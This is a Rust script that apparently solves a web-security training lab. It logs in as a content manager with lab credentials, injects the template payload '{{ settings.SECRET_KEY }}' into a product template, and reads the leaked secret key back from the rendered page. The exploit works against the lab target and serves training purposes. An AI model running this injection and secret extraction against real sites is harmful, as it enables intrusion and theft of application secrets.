/***********************************************************************
*
* Lab: Server-side template injection with information disclosure
*      via user-supplied objects
*
* Hack Steps:
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie to login
*      3. Login as content-manager
*      4. Fetch a product template
*      5. Extract the csrf token to edit the template
*      6. Edit the template and inject the malicious payload
*      7. Fetch the product page after editing to execute the payload
*      8. Extract the secret key
*      9. Submit the solution
*
************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7e00e403b0378d85c977b400b300fd.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as content-manager.. ");
    flush_terminal();

    let content_manager_login = login_as_content_manager(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching a product template.. ");
    flush_terminal();

    session = get_session_cookie(&content_manager_login);
    let template_page = fetch_with_session("/product/template?productId=1", &session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the csrf token to edit the template.. ");
    flush_terminal();

    csrf_token = get_csrf_token(template_page);

    println!("{}", "OK".green());
    print!("⦗6⦘ Editing the template and injecting the malicious payload.. ");
    flush_terminal();

    let payload = r###"{{ settings.SECRET_KEY }}"###;
    edit_template_with_payload(&session, &csrf_token, &payload);

    println!("{}", "OK".green());
    print!("⦗7⦘ Fetching the product page after editing to execute the payload.. ");
    flush_terminal();

    let product_page = fetch("/product?productId=1"); // productId should be the same as the one used in editing template

    println!("{}", "OK".green());
    print!("⦗8⦘ Extracting the secret key.. ");
    flush_terminal();

    let body = product_page.text().unwrap();
    let secret_key = capture_pattern_from_text(r"</label>\s*(\w*)\s*", &body);

    println!("{} => {}", "OK".green(), secret_key.yellow());
    print!("⦗9⦘ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&secret_key);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the login page".red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the login page".red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_content_manager(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "content-manager"),
            ("password", "C0nt3ntM4n4g3r"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn edit_template_with_payload(session: &str, csrf_token: &str, payload: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/product/template?productId=1"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("template", payload),
            ("csrf", csrf_token),
            ("template-action", "save"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
